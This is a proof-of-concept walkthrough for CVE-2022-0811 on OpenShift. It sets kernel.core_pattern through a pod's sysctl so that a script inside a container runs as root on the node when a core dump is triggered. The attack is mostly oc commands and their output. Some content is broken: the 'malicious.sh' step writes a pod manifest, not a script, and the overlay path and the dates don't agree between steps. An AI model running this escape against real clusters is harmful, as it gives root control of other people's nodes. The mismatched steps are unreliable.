# Proof of Concept: Leveraging CVE-2022-0811 to Compromise Kubernetes 
##### Many thanks to CrowdStrike cloud security researchers.  This quick quide was created with their findings and tailored for OpenShift specifically.

## Description
A flaw was found in CRI-O in the way it set kernel options for a pod. This issue allows anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime to achieve a container escape and arbitrary code execution as root on the cluster node, where the malicious pod was deployed.

## Directly Affected Software
- CRI-O version 1.19+

## Indirectly Affected Software and Platforms
### While the vulnerability is in CRI-O, software and platforms that depend on it are also likely to be vulnerable, including:
- OpenShift 4.6+
- Oracle Container Engine for Kubernetes

## Remediation
- ### [Red Hat OpenShift - CVE-2022-0811](https://access.redhat.com/security/cve/cve-2022-0811)

## External References
- ### [CrowdStrike](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)
- ### [GitHub cri-o](https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7)

# Overview
#### This proof of concept (POC) uses a malicious PodSpec to set the kernel.core_pattern kernel parameter, which specifies how the kernel should react to a core dump. In this case, we’ll tell it to execute a binary hosted in another pod. That binary will be run as root outside of any container. Finally, we’ll trigger a core dump causing the kernel to invoke the malicious executable.

# Startup Pod to Host Malicious Executable
`oc create -f ./malicious-script-host.yaml`

```
pod/malicious-script-host created
```
# Determine Root Path From Host Mount Namespace
#### This is the path to the root of the container from the perspective of the kernel.
` oc exec malicious-script-host -- mount | grep overlay | awk -F, '{ print $6 }'`
```
upperdir=/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e/diff
```
# Copy contents of malicious.sh
```
oc exec malicious-script-host -- /bin/bash -c "cat <<EOF > /tmp/malicious.sh
apiVersion: v1
kind: Pod
metadata:
  name: malicious-script-host
spec:
  containers:
  - name: ubi-8
    image: registry.access.redhat.com/ubi8/ubi:8.5-236
    command: ["tail", "-f", "/dev/null"]
EOF"
```
# Modify script permissions and verify
`oc exec malicious-script-host -- /bin/bash -c 'chmod 755 /tmp/malicious.sh && ls -al /tmp/malicious.sh'`
```
-rwxr-xr-x. 1 root root 197 Mar 17 19:22 /tmp/malicious.sh
```
# Use Second Pod to Point Core Pattern to Malicious Script
### NOTE: You must ensure this pod runs on the same node as the malicious script pod. 

`oc create -f ./sysctl-set.yaml`
```
pod/sysctl-set created
```
`oc get pods`
```
NAME                    READY   STATUS              RESTARTS   AGE
malicious-script-host   1/1     Running             0          14m
sysctl-set              0/1     ContainerCreating   0          68s
```
### Whether or not the sysctl-set pod starts, it will successfully update the node-wide core_pattern to point into our malicious-script-host container. 
`oc exec malicious-script-host -- /bin/bash -c "cat /proc/sys/kernel/core_pattern"`
```
|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/tmp/malicious.sh #'
```
# First enable core dumps:
`oc exec malicious-script-host -- /bin/bash -c "ulimit -c unlimited && ulimit -c"`
```
unlimited
```

#### Note for ubi8 image ps will need to be installed via
`oc exec malicious-script-host -- /bin/bash -c "yum install procps-ng -y && ps --version"`
```
Installed:
  procps-ng-3.3.15-6.el8.x86_64
ps from procps-ng 3.3.15
```
# Now trigger the core dump:
`oc exec -it malicious-script-host -- /bin/bash`
`tail -f /dev/null &`
`ps`
```
PID   USER     TIME  COMMAND
    1 root      0:00 tail -f /dev/null
   34 root      0:00 /bin/bash
   42 root      0:00 tail -f /dev/null
   43 root      0:00 ps
```
`kill -SIGSEGV 42`
```/ #
[1]+  Segmentation fault (core dumped) tail -f /dev/null
```
# Verify Malicious Script Ran :boom: :beer:

`oc exec malicious-script-host -- /bin/bash -c 'cat /output'`
```
Wed Feb 23 14:20:07 UTC 2022
root
ocp-cluster
```
##### This script was invoked by the kernel outside of the container namespace with root privileges. A real attacker could, as an example, run a reverse shell and gain full control of the node.
